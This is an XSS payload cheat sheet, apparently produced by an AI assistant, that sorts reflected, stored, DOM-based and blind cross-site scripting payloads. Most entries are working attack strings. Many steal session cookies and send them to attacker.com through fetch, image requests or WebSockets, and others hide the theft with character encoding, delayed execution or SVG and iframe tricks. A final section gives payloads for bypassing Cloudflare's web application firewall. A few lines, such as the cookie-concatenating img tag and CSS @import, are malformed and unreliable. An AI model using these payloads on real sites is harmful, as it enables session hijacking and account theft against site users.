------
**Cross-Site Scripting (XSS) Payloads**

## **Reflected Cross-Site Scripting (XSS)**

### **1. Basic Alert:**
```html
<script>alert('XSS');</script>
```

### **2. Stealing Cookies:**
```html
<script>fetch('http://attacker.com/log?cookie=' + document.cookie);</script>
```

### **3. Redirecting the User:**
```html
<script>window.location='http://attacker.com';</script>
```

```html
<input type="text" value="<script>alert(123)</script>">
```

### **4. Bypassing Filters (Using Encoded Characters):**
```html
<img src=x onerror=alert('XSS')>
```
**Encoded Version:**
```html
%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
```

### **5. Using Event Handlers:**
```html
<a href="#" onclick="alert(1)">Click me!</a>
<a href="javascript:alert(1)">Click me</a>
```

### **6. Advanced Payload (Using IIFE):**
```html
<script>(()=>{alert('XSS')})()</script>
<img src="x" onerror="alert&#40;'XSS'&#41;">
<iframe src="javascript:alert(1)"></iframe>
<a href="javascript:alert(1)">Click me</a>
```

---

## **Stored Cross-Site Scripting (Stored XSS)**

### **1. Simple Alert Box:**
```html
<script>alert('XSS');</script>
```

### **2. Stealing Cookies:**
```html
<script>fetch('https://attacker.com/log?cookie=' + document.cookie);</script>
```

### **3. Session Hijacking using Image Tag:**
```html
<img src="x" onerror="fetch('https://attacker.com/log?cookie='+document.cookie)">
```

### **4. Automatic Redirection:**
```html
<script>window.location='https://attacker.com'</script>
```

### **5. Advanced Payloads:**
```html
<svg onload=alert('XSS')>
<input type="text" value="" onfocus="alert('XSS')" autofocus>
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
<script>(function(){alert('XSS')})()</script>
```

---

## **DOM-Based Cross-Site Scripting (DOM XSS)**

### **1. URL Parameter Exploitation:**
```html
http://example.com/page.html?name=<script>alert('XSS')</script>
```

### **2. Location Hash Manipulation:**
```html
http://example.com/page.html#<img src=x onerror=alert('XSS')>
```

### **3. document.referrer Exploitation:**
```html
<a href="http://example.com/vulnerablePage.html">Go to vulnerable site</a>
```

### **4. Using localStorage:**
```html
localStorage.setItem('user', '<img src=x onerror=alert("XSS")>');
location.reload();
```

### **5. Bypassing Filters with eval():**
```html
http://example.com/page.html?data=alert('XSS')
```

### **6. location.search with innerHTML:**
```html
http://example.com/page.html?message=<svg/onload=alert('XSS')>
```

---

## **Basic Blind XSS Payloads**

### **1. Basic Exfiltration using `<script>`:**
```html
<script>new Image().src='https://attacker.com/log?cookie='+document.cookie;</script>
```

### **2. Using fetch() for Stealth:**
```html
<script>
fetch('https://attacker.com/log', {
method: 'POST',
mode: 'no-cors',
body: 'cookie=' + document.cookie + '&url=' + location.href
});
</script>
```

### **3. Stealing Data with an `<img>` Tag:**
```html
<img src="https://attacker.com/log?data=" + document.cookie>
```

---

## **Obfuscated and Filter Evasion Techniques**

### **1. Encoded Characters:**
```html
<script>eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,99,111,109,47,108,111,103,63,99,111,111,107,105,101,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41));</script>
```

### **2. Bypassing Filters with SVG:**
```html
<svg onload="fetch('https://attacker.com/log?cookie='+document.cookie)">
```

### **3. Using setTimeout:**
```html
<script>setTimeout(function(){fetch('https://attacker.com/log?cookie='+document.cookie)}, 2000);</script>
```

---

## **Stealthy Payloads for Non-Script Contexts**

### **1. Using an HTML Attribute:**
```html
<iframe srcdoc="<script>new Image().src='https://attacker.com/log?cookie='+document.cookie;</script>"></iframe>
```

### **2. CSS-Based Payload:**
```html
<style>@import 'https://attacker.com/log?cookie='+document.cookie;</style>
```

### **3. Exfiltrating via WebSocket:**
```html
<script>
let ws = new WebSocket("wss://attacker.com/socket");
ws.onopen = function() {
ws.send(document.cookie);
};
</script>
```

---

## **Cloudflare Bypass Techniques**
```html
<select><style></select>
<svg onload=alert(1)></style>
"><img src=x onerrora=confirm() onerror=confirm(1)>
<DETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt, a(origin)%20x>
<svg onload=alert&#0000000040"1")><">
<svg%20onx=()%20onload=(confirm) (document.domain)> &#34;><track/onerror=&#x27;confirm\%601\%60&#x27;>
"/><img%20s+src+c=x%20on+onerror+%20="alert(1)">
"></script>"><--<img+src= "><svg/onload=alert(document.cookie)>> --!>
```

This structured document categorizes XSS payloads based on their types, use cases, and evasion techniques. Let me know if you need further modifications or additions!

